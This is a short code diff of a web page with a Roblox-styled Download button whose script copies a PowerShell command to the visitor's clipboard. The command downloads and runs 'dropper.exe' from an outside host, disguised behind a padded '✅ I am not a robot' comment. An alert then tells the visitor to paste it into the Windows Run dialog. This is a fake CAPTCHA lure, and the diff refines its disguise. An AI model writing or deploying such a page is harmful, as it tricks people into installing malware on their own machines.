@@ -53,7 +53,7 @@
     <button class="roblox-button" onclick="copyToClipboard()">Download</button>
     <script>
         function copyToClipboard() {
-            navigator.clipboard.writeText('powershell -Command "Invoke-WebRequest \'http://leonboussen.com/subfolder/dropper.exe\' -OutFile \"$env:TEMP\\dropper.exe\"; Start-Process -FilePath \"$env:TEMP\\dropper.exe\"; pause # ✅ I am not a robot                                                                  ')
+            navigator.clipboard.writeText('powershell -Command "Invoke-WebRequest \'http://leonboussen.com/subfolder/dropper.exe\' -OutFile \"$env:TEMP\\dropper.exe\"; Start-Process -FilePath \"$env:TEMP\\dropper.exe\" #        ✅ I am not a robot                                                                  ')
             .then(() => {
                 alert("🤖 BIEP BOEP wait...\nVerify that you are not a robot\nPress Windows key + R → Ctrl + V → Enter");
             })
